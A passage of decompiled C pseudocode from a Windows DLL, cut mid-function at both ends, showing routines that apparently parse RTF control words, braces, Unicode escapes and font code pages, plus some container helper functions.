  if ( v3 < 0xCu || v3 > 0xEu )
  {
    if ( v3 != 15 )
    {
      v13 = sub_10040BB5(v16, v3);
      v20 = 8;
      sub_10042D3D((int)v13, 548);
    }
    sub_1000B1F3((void *)1, (int)v15, 0);
    v20 = 3;
    sub_1000B79B(v8, v15);
    sub_10041333(v15, a1);
    v10 = *(_BYTE *)sub_1000B4CB((int)v15, v9, 0);
    if ( (v10 & 1) == 0 )
      sub_1004CFD6(0x40u, *(_BYTE **)(a1 + 4));
    sub_1004CFD6(0x80u, *(_BYTE **)(a1 + 4));
    if ( (v10 & 2) == 0 )
    {
      sub_1004CDAF(*(_BYTE **)(a1 + 4));
      sub_1004CDAF(*(_BYTE **)(a1 + 4));
      v2 = a1;
    }
    sub_1004CE34(*(_BYTE **)(v2 + 4), *(_BYTE *)(v2 + 20));
    sub_1004CE95(*(_BYTE **)(v2 + 4), *(_BYTE *)(v2 + 20));
    if ( (v10 & 4) == 0 )
      sub_1004CFD6(0x40u, *(_BYTE **)(v2 + 4));
    if ( (v10 & 8) == 0 )
      sub_1004CFD6(0x40u, *(_BYTE **)(v2 + 4));
    sub_1004CFD6(0x40u, *(_BYTE **)(v2 + 4));
    if ( (v10 & 0x10) == 0 )
      sub_1004CFD6(0x40u, *(_BYTE **)(v2 + 4));
    sub_1004CCC0(*(void **)(v2 + 4), v14);
    LOBYTE(v20) = 4;
    if ( v14[3] )
    {
      sub_1000D17D(v18, asc_10175714);
      LOBYTE(v20) = 5;
      v11 = sub_1000D2FA(v16, 0);
      LOBYTE(v20) = 6;
      v12 = sub_1000D5FF(v17, (int)v11, v18);
      LOBYTE(v20) = 7;
      sub_1000B261((int)v12, (int)a2, 0);
      v19 = 1;
      LOBYTE(v20) = 6;
      sub_1000D3AD(v17);
      LOBYTE(v20) = 5;
      sub_1000D3AD(v16);
      LOBYTE(v20) = 4;
      sub_1000D3AD(v18);
    }
    else
    {
      sub_1000B1F3(0, (int)a2, 0);
      v19 = 1;
    }
    LOBYTE(v20) = 3;
    sub_1000B3DF(v14);
    LOBYTE(v20) = 0;
    v6 = (int *)v15;
  }
  else
  {
    sub_1004CD33(*(_BYTE **)(a1 + 4));
    sub_1004CFD6(0x100u, *(_BYTE **)(a1 + 4));
    v4 = 8;
    do
    {
      sub_1004CD33(*(_BYTE **)(a1 + 4));
      --v4;
    }
    while ( v4 );
    sub_1004CCC0(*(void **)(a1 + 4), v14);
    v20 = 1;
    v5 = sub_1000D2FA(v18, 0);
    LOBYTE(v20) = 2;
    sub_1000B261((int)v5, (int)a2, 1);
    v19 = 1;
    LOBYTE(v20) = 1;
    sub_1000D3AD(v18);
    LOBYTE(v20) = 0;
    v6 = v14;
  }
  sub_1000B3DF(v6);
  return a2;
}
// 10041A0C: variable 'v8' is possibly undefined
// 10041A1D: variable 'v9' is possibly undefined

//----- (10041B96) --------------------------------------------------------
void *__userpurge sub_10041B96@<eax>(void **a1@<esi>, void *a2)
{
  int v2; // ebx
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v6[5]; // [esp+10h] [ebp-3Ch] BYREF
  int v7[2]; // [esp+24h] [ebp-28h] BYREF
  int v8[2]; // [esp+2Ch] [ebp-20h] BYREF
  int v9[2]; // [esp+34h] [ebp-18h] BYREF
  int v10; // [esp+3Ch] [ebp-10h]
  int v11; // [esp+48h] [ebp-4h]

  v10 = 0;
  v2 = 11;
  do
  {
    sub_1004CD33(a1[1]);
    --v2;
  }
  while ( v2 );
  sub_1004C98C(a1[1]);
  sub_1004C98C(a1[1]);
  sub_1004CD33(a1[1]);
  sub_1004CD33(a1[1]);
  sub_1004CCC0(a1[1], v6);
  v11 = 1;
  if ( v6[3] )
  {
    sub_1000D17D(v9, asc_1017571C);
    LOBYTE(v11) = 2;
    v3 = sub_10041C89(a1, v7, v6, 1);
    LOBYTE(v11) = 3;
    v4 = sub_1000D5FF(v8, (int)v3, v9);
    LOBYTE(v11) = 4;
    sub_1000B261((int)v4, (int)a2, 0);
    v10 = 1;
    LOBYTE(v11) = 3;
    sub_1000D3AD(v8);
    LOBYTE(v11) = 2;
    sub_1000D3AD(v7);
    LOBYTE(v11) = 1;
    sub_1000D3AD(v9);
  }
  else
  {
    sub_1000B1F3(0, (int)a2, 0);
    v10 = 1;
  }
  LOBYTE(v11) = 0;
  sub_1000B3DF(v6);
  return a2;
}

//----- (10041C89) --------------------------------------------------------
_DWORD *__thiscall sub_10041C89(void *this, _DWORD *a2, _DWORD *a3, char a4)
{
  int v5; // esi
  int v6; // eax
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  unsigned int v9; // eax
  _DWORD *v10; // eax
  int v11; // ebx
  int v12; // eax
  _DWORD *v13; // eax
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // eax
  int v18[5]; // [esp+10h] [ebp-94h] BYREF
  int v19[5]; // [esp+24h] [ebp-80h] BYREF
  int v20[5]; // [esp+38h] [ebp-6Ch] BYREF
  int v21[5]; // [esp+4Ch] [ebp-58h] BYREF
  int v22[2]; // [esp+60h] [ebp-44h] BYREF
  int v23[2]; // [esp+68h] [ebp-3Ch] BYREF
  int v24[2]; // [esp+70h] [ebp-34h] BYREF
  int v25[2]; // [esp+78h] [ebp-2Ch] BYREF
  int v26; // [esp+80h] [ebp-24h]
  void *v27; // [esp+84h] [ebp-20h]
  _DWORD *v28; // [esp+88h] [ebp-1Ch]
  int v29[2]; // [esp+8Ch] [ebp-18h] BYREF
  int v30; // [esp+94h] [ebp-10h]
  int v31; // [esp+A0h] [ebp-4h]
  unsigned int v32; // [esp+B0h] [ebp+Ch]

  v27 = this;
  v30 = 0;
  if ( a3[3] )
  {
    v32 = 0;
    sub_1000D1D6(v29, 0);
    v31 = 1;
    if ( a3[3] )
    {
      do
      {
        v5 = sub_100425E8(a3, v32, 123);
        v6 = a3[3];
        if ( v5 == -1 )
        {
          v7 = (_DWORD *)sub_1000B67C(a3, (int)v21, v32, v6 - v32);
          LOBYTE(v31) = 2;
          v8 = sub_10041E91(v7, v22);
          LOBYTE(v31) = 3;
          sub_1000D575((int)v29, v8);
          LOBYTE(v31) = 2;
          sub_1000D3AD(v22);
          LOBYTE(v31) = 1;
          sub_1000B3DF(v21);
          v9 = a3[3];
        }
        else
        {
          v10 = (_DWORD *)sub_1000B67C(a3, (int)v19, v5 + 1, v6 - v5 - 1);
          LOBYTE(v31) = 4;
          v11 = sub_10042663(v10);
          LOBYTE(v31) = 1;
          sub_1000B3DF(v19);
          if ( v11 == -1 )
          {
            v16 = sub_10040C98(v25);
            LOBYTE(v31) = 5;
            sub_10042D5F((int)v16, 606);
          }
          v26 = v11 + v5 + 1;
          v12 = sub_1000B67C(a3, (int)v18, v5 + 1, v11);
          LOBYTE(v31) = 6;
          v28 = (_DWORD *)sub_10041C89(v25, v12, 0);
          LOBYTE(v31) = 7;
          v13 = (_DWORD *)sub_1000B67C(a3, (int)v20, v32, v5 - v32);
          LOBYTE(v31) = 8;
          v14 = sub_10041E91(v13, v23);
          LOBYTE(v31) = 9;
          v15 = sub_1000D5FF(v24, (int)v14, v28);
          LOBYTE(v31) = 10;
          sub_1000D575((int)v29, v15);
          LOBYTE(v31) = 9;
          sub_1000D3AD(v24);
          LOBYTE(v31) = 8;
          sub_1000D3AD(v23);
          LOBYTE(v31) = 7;
          sub_1000B3DF(v20);
          LOBYTE(v31) = 6;
          sub_1000D3AD(v25);
          LOBYTE(v31) = 1;
          sub_1000B3DF(v18);
          v9 = v26 + 1;
        }
        v32 = v9;
      }
      while ( v9 < a3[3] );
    }
    if ( a4 )
      sub_10042286(v29, a2);
    else
      sub_1000D372(a2, (int)v29);
    v30 = 1;
    LOBYTE(v31) = 0;
    sub_1000D3AD(v29);
  }
  else
  {
    sub_1000D17D(a2, &word_10175724);
    v31 = 0;
    v30 = 1;
  }
  return a2;
}
// 10041C89: using guessed type int var_58[5];
// 10041C89: using guessed type int var_80[5];
// 10041C89: using guessed type int var_94[5];
// 10041C89: using guessed type int var_6C[5];

//----- (10041E91) --------------------------------------------------------
_DWORD *__userpurge sub_10041E91@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  unsigned int v2; // ebx
  int v3; // edi
  unsigned int v4; // eax
  _DWORD *v5; // eax
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // eax
  int v9; // eax
  _DWORD *v10; // eax
  _DWORD *v12; // eax
  int v13[5]; // [esp+10h] [ebp-6Ch] BYREF
  int v14[5]; // [esp+24h] [ebp-58h] BYREF
  int v15[5]; // [esp+38h] [ebp-44h] BYREF
  int v16[2]; // [esp+4Ch] [ebp-30h] BYREF
  int v17[2]; // [esp+54h] [ebp-28h] BYREF
  int v18[2]; // [esp+5Ch] [ebp-20h] BYREF
  int v19; // [esp+64h] [ebp-18h]
  int v20; // [esp+68h] [ebp-14h] BYREF
  UINT CodePage; // [esp+6Ch] [ebp-10h]
  int v22; // [esp+78h] [ebp-4h]

  v2 = 0;
  v19 = 0;
  if ( a1[3] )
  {
    sub_1000D1D6(v18, 0);
    v22 = 1;
    CodePage = 0;
    v3 = sub_100425E8(a1, 0, 92);
    v4 = a1[3];
    if ( v4 )
    {
      do
      {
        if ( v3 == v4 )
        {
          v12 = sub_10040C98(v16);
          LOBYTE(v22) = 2;
          sub_10042D5F((int)v12, 646);
        }
        if ( v3 == -1 )
        {
          sub_1000B67C(a1, (int)v15, v2, v4 - v2);
          LOBYTE(v22) = 3;
          v5 = sub_1000D2FA(v17, CodePage);
          LOBYTE(v22) = 4;
          sub_1000D575((int)v18, v5);
          LOBYTE(v22) = 3;
          sub_1000D3AD(v17);
          LOBYTE(v22) = 1;
          sub_1000B3DF(v15);
          v2 = a1[3];
        }
        else
        {
          v6 = a1[1];
          v7 = a1[2];
          if ( *(_BYTE *)(v7 + *(_DWORD *)(v6 + 12) + v3 + 1) == 102
            || *(_BYTE *)(v7 + *(_DWORD *)(v6 + 12) + v3 + 1) == 70 )
          {
            sub_1000B67C(a1, (int)v14, v2, v3 - v2);
            LOBYTE(v22) = 5;
            v8 = sub_1000D2FA(v16, CodePage);
            LOBYTE(v22) = 6;
            sub_1000D575((int)v18, v8);
            LOBYTE(v22) = 5;
            sub_1000D3AD(v16);
            LOBYTE(v22) = 1;
            sub_1000B3DF(v14);
            v9 = a1[3];
            v20 = 0;
            v10 = (_DWORD *)sub_1000B67C(a1, (int)v13, v3, v9 - v3);
            LOBYTE(v22) = 7;
            CodePage = sub_1004204D(&v20, v10);
            LOBYTE(v22) = 1;
            sub_1000B3DF(v13);
            v2 = v20 + v3 + 1;
          }
          v3 = sub_100425E8(a1, v3 + 1, 92);
        }
        v4 = a1[3];
      }
      while ( v2 < v4 );
    }
    sub_1000D372(a2, (int)v18);
    v19 = 1;
    LOBYTE(v22) = 0;
    sub_1000D3AD(v18);
  }
  else
  {
    sub_1000D17D(a2, &word_10175728);
    v22 = 0;
    v19 = 1;
  }
  return a2;
}
// 10041E91: using guessed type int var_44[5];
// 10041E91: using guessed type int var_58[5];
// 10041E91: using guessed type int var_6C[5];

//----- (1004204D) --------------------------------------------------------
int __thiscall sub_1004204D(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // ebx
  int v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int v8; // esi
  _DWORD *v9; // ebx
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  size_t v12; // eax
  _DWORD *v13; // eax
  unsigned int v14; // ebx
  int v15; // ecx
  int v16; // edx
  int v17; // eax
  char v18; // al
  bool v19; // bl
  _DWORD *v20; // eax
  size_t v21; // edi
  void *v22; // ebx
  _DWORD *v23; // eax
  int v24; // eax
  int v25; // eax
  size_t v27; // [esp-4h] [ebp-68h]
  int v28[5]; // [esp+10h] [ebp-54h] BYREF
  int v29[5]; // [esp+24h] [ebp-40h] BYREF
  int v30[5]; // [esp+38h] [ebp-2Ch] BYREF
  void *v31; // [esp+4Ch] [ebp-18h] BYREF
  void *Block; // [esp+50h] [ebp-14h]
  size_t Size; // [esp+54h] [ebp-10h]
  int v34; // [esp+60h] [ebp-4h]

  if ( !this )
  {
    v3 = sub_1000E7F7(&a2, 1, 0);
    v34 = 0;
    sub_10007882((int)v3);
  }
  v4 = a2;
  v5 = sub_100425E8(a2, 0, 59);
  *this = v5;
  if ( v5 == -1 )
  {
    v6 = sub_10040C98(&v31);
    v34 = 1;
    sub_10042D5F((int)v6, 685);
  }
  v7 = (_DWORD *)sub_1000B67C(v4, (int)v30, 0, v5);
  v34 = 2;
  v8 = sub_100425E8(v7, 0, 99);
  v34 = -1;
  sub_1000B3DF(v30);
  Size = 0;
  if ( v8 != -1 )
  {
    do
    {
      v9 = a2;
      if ( *(_BYTE *)(a2[2] + *(_DWORD *)(a2[1] + 12) + v8 - 1) == 124 )
        break;
      v10 = (_DWORD *)sub_1000B67C(a2, (int)v29, 0, *this);
      v34 = 3;
      v8 = sub_100425E8(v10, v8 + 1, 99);
      v34 = -1;
      sub_1000B3DF(v29);
    }
    while ( v8 != -1 );
    if ( v8 != -1 )
    {
      v11 = (_DWORD *)sub_1000B67C(v9, (int)v28, 0, *this);
      v34 = 4;
      Size = sub_100425E8(v11, v8 + 1, 124);
      v34 = -1;
      sub_1000B3DF(v28);
      v12 = Size;
      if ( Size == -1 )
        v12 = *this;
      Size = v12 - v8 - 1;
      v13 = (_DWORD *)sub_1000B67C(a2, (int)v28, v8 + 1, Size);
      v34 = 5;
      v14 = v13[3];
      v15 = 0;
      if ( v14 )
      {
        v16 = v13[1];
        v17 = v13[2];
        while ( *(_BYTE *)(v17 + *(_DWORD *)(v16 + 12) + v15) >= 0x30u
             && *(_BYTE *)(v17 + *(_DWORD *)(v16 + 12) + v15) <= 0x39u )
        {
          if ( ++v15 >= v14 )
            goto LABEL_16;
        }
        v18 = 0;
      }
      else
      {
LABEL_16:
        v18 = 1;
      }
      v19 = v18 == 0;
      v34 = -1;
      sub_1000B3DF(v28);
      if ( v19 )
      {
        v20 = sub_10040C98(&v31);
        v34 = 6;
        sub_10042D5F((int)v20, 724);
      }
      v21 = Size + 1;
      v22 = operator new(Size + 1);
      v23 = operator new(4u);
      Block = v23;
      v34 = 7;
      if ( v23 )
        *v23 = 1;
      else
        v23 = 0;
      Block = v23;
      v31 = v22;
      v34 = 8;
      memset(v22, 0, v21);
      v27 = Size;
      v24 = sub_1000B4B8(a2);
      memcpy(v22, (const void *)(v24 + v8 + 1), v27);
      Size = StrToIntA((PCSTR)v22);
      v34 = -1;
      sub_100403FE(&v31);
    }
  }
  v25 = 0;
  while ( dword_100FF6B8[2 * v25] != Size )
  {
    if ( (unsigned int)++v25 >= 8 )
      return 0;
  }
  return dword_100FF6BC[2 * v25];
}
// 100FF6B8: using guessed type int dword_100FF6B8[];
// 100FF6BC: using guessed type int dword_100FF6BC[104];
// 1004204D: using guessed type int var_2C[5];
// 1004204D: using guessed type int var_40[5];
// 1004204D: using guessed type int var_54[5];

//----- (10042286) --------------------------------------------------------
_DWORD *__thiscall sub_10042286(_DWORD *this, _DWORD *a2)
{
  signed int v3; // ebx
  int v4; // eax
  int v5; // eax
  int v6; // edi
  _DWORD *v7; // eax
  int v8; // edx
  int v9; // edx
  int *v10; // ecx
  _DWORD *v11; // eax
  int v12; // eax
  int v13; // eax
  _DWORD *v14; // eax
  LONG *v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  _DWORD *v18; // eax
  _DWORD *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // eax
  _DWORD *v23; // eax
  _DWORD *v24; // eax
  int v25[5]; // [esp+10h] [ebp-8Ch] BYREF
  int v26; // [esp+24h] [ebp-78h] BYREF
  int v27; // [esp+2Ch] [ebp-70h] BYREF
  int v28; // [esp+34h] [ebp-68h] BYREF
  int v29; // [esp+3Ch] [ebp-60h] BYREF
  int v30[2]; // [esp+44h] [ebp-58h] BYREF
  int v31[2]; // [esp+4Ch] [ebp-50h] BYREF
  int v32[2]; // [esp+54h] [ebp-48h] BYREF
  _DWORD v33[2]; // [esp+5Ch] [ebp-40h] BYREF
  int v34[2]; // [esp+64h] [ebp-38h] BYREF
  int v35[2]; // [esp+6Ch] [ebp-30h] BYREF
  int v36[2]; // [esp+74h] [ebp-28h] BYREF
  int v37; // [esp+7Ch] [ebp-20h]
  int v38; // [esp+80h] [ebp-1Ch]
  int v39; // [esp+84h] [ebp-18h] BYREF
  int v40; // [esp+88h] [ebp-14h]
  int v41; // [esp+98h] [ebp-4h]

  v3 = 0;
  v38 = 0;
  sub_1000D17D(a2, &word_1017572C);
  v41 = 0;
  v4 = *(_DWORD *)(this[1] + 28);
  v38 = 1;
  v40 = v4;
  if ( v4 > 0 )
  {
    do
    {
      v5 = sub_1000DE8B(v3, (int)this, 0x5Cu);
      v6 = v5;
      if ( v5 == -1 )
        break;
      if ( v5 == v40 )
      {
        v20 = sub_10040C98(v30);
        v41 = 1;
        sub_10042D5F((int)v20, 774);
      }
      v7 = sub_1000D836(v5 - v3, (int)this, v34, v3);
      v41 = 2;
      sub_1000D575((int)a2, v7);
      LOBYTE(v41) = 0;
      sub_1000D3AD(v34);
      v39 = 0;
      v3 = v6 + 1;
      switch ( sub_1000D45C(v6 + 1, v8, (int)this) )
      {
        case 'A':
        case 'C':
        case 'F':
        case 'H':
        case 'Q':
        case 'T':
        case 'W':
        case 'f':
          v12 = sub_1000DE8B(v6 + 2, (int)this, 0x3Bu);
          if ( v12 == -1 )
          {
            v21 = sub_10040C98(&v29);
            v41 = 5;
            sub_10042D5F((int)v21, 818);
          }
          v3 = v12 + 1;
          break;
        case 'L':
        case 'O':
        case 'l':
        case 'o':
          goto LABEL_5;
        case 'P':
          sub_1000D17D(v35, asc_10175734);
          v41 = 8;
          sub_1000D575((int)a2, v35);
          LOBYTE(v41) = 0;
          v10 = v35;
          goto LABEL_7;
        case 'S':
          v13 = sub_1000DE8B(v6 + 2, (int)this, 0x3Bu);
          v37 = v13;
          if ( v13 == -1 )
          {
            v22 = sub_10040C98(&v28);
            v41 = 6;
            sub_10042D5F((int)v22, 827);
          }
          v14 = sub_1000D836(v13 - v6 - 2, (int)this, v32, v6 + 2);
          v41 = 7;
          sub_1000D575((int)a2, v14);
          LOBYTE(v41) = 0;
          sub_1000D3AD(v32);
          v3 = v37 + 1;
          break;
        case 'U':
          if ( v6 + 6 >= v40 )
          {
            v23 = sub_10040C98(&v27);
            v41 = 9;
            sub_10042D5F((int)v23, 844);
          }
          if ( sub_1000D45C(v6 + 2, v9, (int)this) != 43 )
          {
            v24 = sub_10040C98(&v26);
            v41 = 10;
            sub_10042D5F((int)v24, 849);
          }
          v15 = sub_1000D836(4, (int)this, v31, v6 + 3);
          v41 = 11;
          v39 = (unsigned __int16)sub_10042745(v15);
          LOBYTE(v41) = 0;
          sub_1000D3AD(v31);
          v16 = (_DWORD *)sub_1000B1F3((void *)2, (int)v25, &v39);
          v41 = 12;
          v17 = sub_1000D230(v16, v30);
          LOBYTE(v41) = 13;
          sub_1000D575((int)a2, v17);
          LOBYTE(v41) = 12;
          sub_1000D3AD(v30);
          LOBYTE(v41) = 0;
          sub_1000B3DF(v25);
          v3 = v6 + 7;
          break;
        case '\\':
        case '{':
        case '}':
          v11 = sub_1000D836(1, (int)this, v33, v6 + 1);
          v41 = 4;
          sub_1000D575((int)a2, v11);
          LOBYTE(v41) = 0;
          v10 = v33;
          goto LABEL_7;
        case '~':
          sub_1000D17D(v36, asc_10175730);
          v41 = 3;
          sub_1000D575((int)a2, v36);
          LOBYTE(v41) = 0;
          v10 = v36;
LABEL_7:
          sub_1000D3AD(v10);
LABEL_5:
          v3 = v6 + 2;
          break;
        default:
          break;
      }
    }
    while ( v3 < v40 );
  }
  v18 = sub_1000D836(-2, (int)this, v30, v3);
  v41 = 14;
  sub_1000D575((int)a2, v18);
  LOBYTE(v41) = 0;
  sub_1000D3AD(v30);
  return a2;
}
// 1004231A: variable 'v8' is possibly undefined
// 10042442: variable 'v9' is possibly undefined
// 10042286: using guessed type _DWORD var_40[2];
// 10042286: using guessed type int var_8C[5];

//----- (100425E8) --------------------------------------------------------
int __fastcall sub_100425E8(_DWORD *a1, unsigned int a2, char a3)
{
  unsigned int v3; // esi
  int v4; // eax
  int v5; // edx
  _DWORD *v7; // eax

  v3 = a1[3];
  while ( v3 )
  {
    if ( a2 >= v3 )
    {
      v7 = sub_1000E7F7(&a3, 1, 0);
      sub_10007882((int)v7);
    }
    v4 = sub_1000B4B8(a1);
    if ( v5 >= v3 )
    {
LABEL_7:
      v5 = -1;
    }
    else
    {
      while ( *(unsigned __int8 *)(v5 + v4) != a3 )
      {
        if ( ++v5 >= v3 )
          goto LABEL_7;
      }
    }
    if ( v5 <= 0 || *(_BYTE *)(a1[2] + *(_DWORD *)(a1[1] + 12) + v5 - 1) != 92 )
      return v5;
    a2 = v5 + 1;
    if ( a2 == v3 )
      return -1;
  }
  return -1;
}
// 100425FF: variable 'a1' is possibly undefined
// 10042606: variable 'v5' is possibly undefined

//----- (10042663) --------------------------------------------------------
int __thiscall sub_10042663(_DWORD *this)
{
  int result; // eax
  int v3; // edi
  _DWORD *v4; // eax
  int v5; // esi
  char *i; // ecx
  _DWORD *v7; // eax
  char v8[20]; // [esp+10h] [ebp-40h] BYREF
  char v9[20]; // [esp+24h] [ebp-2Ch] BYREF
  int v10; // [esp+38h] [ebp-18h]
  int v11; // [esp+3Ch] [ebp-14h]
  int v12; // [esp+40h] [ebp-10h]
  int v13; // [esp+4Ch] [ebp-4h]

  if ( !this[3] )
    return -1;
  v11 = 0;
  v12 = 1;
  v3 = sub_100425E8(this, 0, 125);
  while ( 1 )
  {
    result = -1;
    if ( v3 == -1 )
      break;
    --v12;
    v10 = v3 - v11;
    v4 = (_DWORD *)sub_1000B67C(this, (int)v9, v11, v3 - v11);
    v13 = 0;
    v5 = sub_100425E8(v4, 0, 123);
    v13 = -1;
    for ( i = v9; ; i = v8 )
    {
      sub_1000B3DF((int *)i);
      if ( v5 == -1 )
        break;
      ++v12;
      v7 = (_DWORD *)sub_1000B67C(this, (int)v8, v11, v10);
      v13 = 1;
      v5 = sub_100425E8(v7, v5 + 1, 123);
      v13 = -1;
    }
    if ( v3 == this[3] - 1 )
    {
      if ( v12 )
        return -1;
      return v3;
    }
    v11 = v3;
    v3 = sub_100425E8(this, v3 + 1, 125);
    if ( v12 <= 0 )
      return v11;
  }
  return result;
}

//----- (10042745) --------------------------------------------------------
__int16 __thiscall sub_10042745(LONG *this)
{
  LONG v2; // eax
  _DWORD *v3; // eax
  unsigned int v4; // esi
  LONG *v5; // eax
  LONG *v6; // eax
  LONG *v7; // eax
  char *v8; // eax
  __int16 v9; // cx
  unsigned __int16 v10; // cx
  _DWORD *v11; // eax
  unsigned __int16 v12; // si
  __int16 v13; // cx
  __int16 v14; // cx
  __int16 v15; // si
  __int16 v16; // cx
  __int16 v17; // cx
  char v18; // al
  __int16 v19; // si
  __int16 v20; // ax
  int v22; // [esp+10h] [ebp-18h] BYREF
  int v23[4]; // [esp+14h] [ebp-14h] BYREF
  int v24; // [esp+24h] [ebp-4h]

  v2 = this[1];
  if ( *(_DWORD *)(v2 + 28) != 4 )
  {
    v3 = sub_1000E7F7(v23, 1, 0);
    v24 = 0;
    sub_10007882((int)v3);
  }
  v4 = 0;
  if ( *(_DWORD *)(v2 + 28) )
  {
    do
    {
      if ( *(char *)(sub_1000D3DA((int)this) + v4) < 48 || *(char *)(sub_1000D3DA((int)this) + v4) > 57 )
      {
        v5 = sub_1000D984(this);
        if ( *(char *)(sub_1000D3DA((int)v5) + v4) < 65
          || (v6 = sub_1000D984(this), *(char *)(sub_1000D3DA((int)v6) + v4) > 70) )
        {
          v11 = sub_10040C98(&v22);
          v24 = 1;
          sub_10042D5F((int)v11, 1004);
        }
      }
      ++v4;
    }
    while ( v4 < *(_DWORD *)(this[1] + 28) );
  }
  v7 = sub_1000D984(this);
  v8 = (char *)sub_1000D3DA((int)v7);
  v9 = v8[3];
  if ( (unsigned __int8)(v8[3] - 65) > 5u )
    v10 = v9 - 48;
  else
    v10 = v9 - 55;
  v23[0] = v10;
  v12 = v10;
  v13 = v8[2];
  if ( (unsigned __int8)(v8[2] - 65) > 5u )
    v14 = v13 - 48;
  else
    v14 = v13 - 55;
  v15 = 16 * v14 + v12;
  v16 = v8[1];
  if ( (unsigned __int8)(v8[1] - 65) > 5u )
    v17 = v16 - 48;
  else
    v17 = v16 - 55;
  v18 = *v8;
  v19 = (v17 << 8) + v15;
  if ( (unsigned __int8)(v18 - 65) > 5u )
    v20 = v18 - 48;
  else
    v20 = v18 - 55;
  return (v20 << 12) + v19;
}
// 10042745: using guessed type int var_14[4];

//----- (10042882) --------------------------------------------------------
void __thiscall sub_10042882(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi

  *this = &off_10103F68;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[3];
    j__free(i);
  }
  sub_10039F05(this);
}
// 10103F68: using guessed type int (__thiscall *off_10103F68)(void *Block, char);

//----- (100428DA) --------------------------------------------------------
void *__thiscall sub_100428DA(void *this, int a2)
{
  sub_10042B02(a2, (int)this);
  return this;
}

//----- (100428EC) --------------------------------------------------------
_DWORD *__thiscall sub_100428EC(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10103FA8;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103FA8: using guessed type int (__thiscall *off_10103FA8)(void *Block, char);

//----- (10042948) --------------------------------------------------------
_DWORD *__thiscall sub_10042948(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10103FA8;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10039112(a2, (int)v3);
  return a2;
}
// 10103FA8: using guessed type int (__thiscall *off_10103FA8)(void *Block, char);

//----- (100429A4) --------------------------------------------------------
_DWORD *__thiscall sub_100429A4(void *this, _DWORD *a2, unsigned int a3)
{
  int v4; // edi
  unsigned int v5; // eax
  _DWORD *v6; // eax
  int v7; // esi
  int v9; // [esp+10h] [ebp-14h] BYREF
  int v10; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  v4 = 0;
  v11 = 0;
  v10 = 0;
  v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v5 )
  {
    v6 = sub_1000E8EF(&a3);
    v11 = 1;
    goto LABEL_3;
  }
  (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)this + 12))(this, a2);
  v11 = 0;
  v10 = 1;
  if ( a3 )
  {
    while ( 1 )
    {
      v7 = *a2;
      if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 4))(*a2) )
        break;
      (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 16))(v7);
      if ( ++v4 >= a3 )
        return a2;
    }
    v6 = sub_1000E8EF(&v9);
    v11 = 2;
LABEL_3:
    sub_100078FE((int)v6);
  }
  return a2;
}

//----- (10042A2E) --------------------------------------------------------
int __thiscall sub_10042A2E(void *this, int a2)
{
  int v2; // esi
  void *v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1003406C(v4);
  return v2;
}

//----- (10042A6A) --------------------------------------------------------
void __thiscall sub_10042A6A(void *this)
{
  void *v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(void *))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1003406C(v1);
}

//----- (10042AAB) --------------------------------------------------------
int __usercall sub_10042AAB@<eax>(int a1@<esi>)
{
  _DWORD *v1; // eax
  _DWORD v3[4]; // [esp+10h] [ebp-10h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) )
  {
    v1 = sub_1000E8EF(v3);
    v3[3] = 0;
    sub_100078FE((int)v1);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a1 + 16))(a1);
  return a1;
}

//----- (10042AE6) --------------------------------------------------------
_DWORD *__thiscall sub_10042AE6(_DWORD *Block, char a2)
{
  sub_10042882(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10042B02) --------------------------------------------------------
void __usercall sub_10042B02(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  void *v4[3]; // [esp+Ch] [ebp-18h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, void **))(*(_DWORD *)a1 + 8))(a1, v4);
  v5 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v4[0] + 4))(v4[0]) )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v4[0] + 12))(v4[0]);
